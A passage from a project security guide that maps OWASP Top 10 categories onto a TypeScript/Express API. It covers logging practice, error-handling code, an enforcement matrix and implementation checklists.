- API key creation/deletion
- Sensitive data access
- Account lockouts
- Unusual patterns (rapid requests, access from new location)

**What NOT to log:**

- Passwords (plain or hashed)
- Session tokens
- API keys (plain text)
- Credit card numbers
- Personal data (unless necessary for audit)

### Checklist

- [ ] Failed login attempts logged
- [ ] 403 authorization failures logged
- [ ] Sensitive operations logged (password reset, email change)
- [ ] Unexpected errors logged server-side
- [ ] NO sensitive data in logs (passwords, tokens)
- [ ] Monitoring dashboard (future: Sentry, Datadog)
- [ ] Alerting on security events (future enhancement)

---

## A10: Mishandling of Exceptional Conditions

**Priority:** ADVISORY | **Enforcement:** ADVISORY

**CWEs:** CWE-755 Improper Handling of Exceptional Conditions, CWE-252 Unchecked Return Value

### Description

Improper handling of errors and exceptional conditions can lead to unexpected application behavior, denial of service, or information disclosure.

### Prevention Strategies

#### 1. Global Error Handler

```typescript
// apps/api/src/middleware/error-handler.ts
export const errorHandler = (err: Error, req: Request, res: Response, next: NextFunction) => {
  // Log all errors server-side
  logger.error('Request error', {
    error: { message: err.message, stack: err.stack },
    request: { method: req.method, url: req.url },
  })

  // Return sanitized errors to client
  if (err instanceof AppError) {
    return res.status(err.statusCode).json({
      error: { code: err.code, message: err.message, details: err.details },
    })
  }

  if (err instanceof ZodError) {
    return res.status(400).json({
      error: {
        code: 'VALIDATION_ERROR',
        message: 'Invalid request data',
        details: {
          fields: err.errors.map((e) => ({ path: e.path.join('.'), message: e.message })),
        },
      },
    })
  }

  // Generic error
  res.status(500).json({
    error: { code: 'INTERNAL_ERROR', message: 'An unexpected error occurred', details: {} },
  })
}
```

#### 2. Unhandled Promise Rejections

```typescript
// apps/api/src/index.ts
process.on('unhandledRejection', (reason, promise) => {
  logger.error('Unhandled promise rejection', { reason, promise })
  // Optionally: exit process
  process.exit(1)
})

process.on('uncaughtException', (error) => {
  logger.error('Uncaught exception', { error })
  // Exit process
  process.exit(1)
})
```

#### 3. Input Validation Edge Cases

```typescript
// ✅ SECURE - Handle null, undefined, out-of-range
const PaginationSchema = z.object({
  cursor: z.string().optional(),
  limit: z.coerce.number().min(1).max(100).default(20),
})

const { cursor, limit } = PaginationSchema.parse(req.query)
```

### Checklist

- [ ] Global error handler configured
- [ ] All async operations in try/catch
- [ ] Unhandled promise rejections caught
- [ ] Input validation handles: null, undefined, empty string, out-of-range
- [ ] Error responses sanitized (no stack traces)
- [ ] Errors logged server-side with context

---

## Summary

### Enforcement Matrix

| OWASP | Vulnerability             | Priority | Enforcement               |
| ----- | ------------------------- | -------- | ------------------------- |
| A01   | Broken Access Control     | CRITICAL | BLOCK                     |
| A02   | Security Misconfiguration | CRITICAL | BLOCK                     |
| A03   | Supply Chain Failures     | CRITICAL | WARN (block on high CVEs) |
| A04   | Cryptographic Failures    | MODERATE | WARN                      |
| A05   | Injection                 | MODERATE | WARN                      |
| A06   | Insecure Design           | ADVISORY | ADVISORY                  |
| A07   | Authentication Failures   | MODERATE | WARN                      |
| A08   | Data Integrity Failures   | ADVISORY | ADVISORY                  |
| A09   | Logging/Alerting          | ADVISORY | ADVISORY                  |
| A10   | Exception Handling        | ADVISORY | ADVISORY                  |

### Implementation Checklist

**Phase 1: Critical (Block on Commit)**

- [ ] `.claude/rules/security.md` enforced
- [ ] `.claude/hooks/security-check.sh` active
- [ ] Tenant isolation validated (req.tenantId)
- [ ] Security headers configured (helmet)
- [ ] pnpm audit in CI (fail on high/critical)

**Phase 2: Moderate (Warn on Commit)**

- [ ] bcrypt for passwords (work factor ≥10)
- [ ] crypto.randomBytes() for tokens
- [ ] Prisma ORM (no $queryRawUnsafe)
- [ ] React auto-escaping (no dangerouslySetInnerHTML without DOMPurify)
- [ ] JWT short-lived (≤15m) + refresh rotation

**Phase 3: Advisory (Recommendations)**

- [ ] Threat modeling for new features
- [ ] Rate limiting on auth/expensive endpoints
- [ ] Security event logging
- [ ] Unhandled promise rejection handler

---

## Resources

- [OWASP Top 10 2025](https://owasp.org/Top10/2025/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Prisma Security Best Practices](https://www.prisma.io/docs/guides/database/advanced-database-tasks/sql-injection)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [React Security](https://react.dev/learn/escape-hatches)
- [Node.js Security Checklist](https://nodejs.org/en/docs/guides/security/)
